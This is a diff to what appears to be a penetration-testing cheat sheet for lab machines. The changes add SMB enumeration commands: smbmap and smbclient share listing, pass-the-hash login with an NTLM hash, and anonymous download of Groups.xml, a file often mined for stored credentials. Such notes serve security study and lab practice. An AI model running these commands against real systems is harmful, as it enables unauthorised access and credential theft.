@@ -123,9 +123,11 @@ Smbmap (shows a list of SMB Shares)
   Smbmap -u Username -p Password -H 10.10.10.97
   Smbclient -U ‘username%password’ \\\\10.10.10.97\share (recurse on) <- List everything
   Pass the Hash
-  Smbmap -u alice1978 -p ‘NTLM_Hash:NTLM_Hash’ -H 10.10.10.107 
-  -R (-R list contents of shares)
-  --download (download file)
+      Smbmap -u alice1978 -p ‘NTLM_Hash:NTLM_Hash’ -H 10.10.10.107 
+      -R (-R list contents of shares)
+      --download (download file)
+  Download file groups.xml (Anonymous)
+      smbmap -R sharename -H 10.10.10.100 -A Groups.xml (will download to /usr/share/smbmap)
   
 Smbclient
   smbclient -N -L //10.10.10.97 (List all SMB Shares as anonymous)
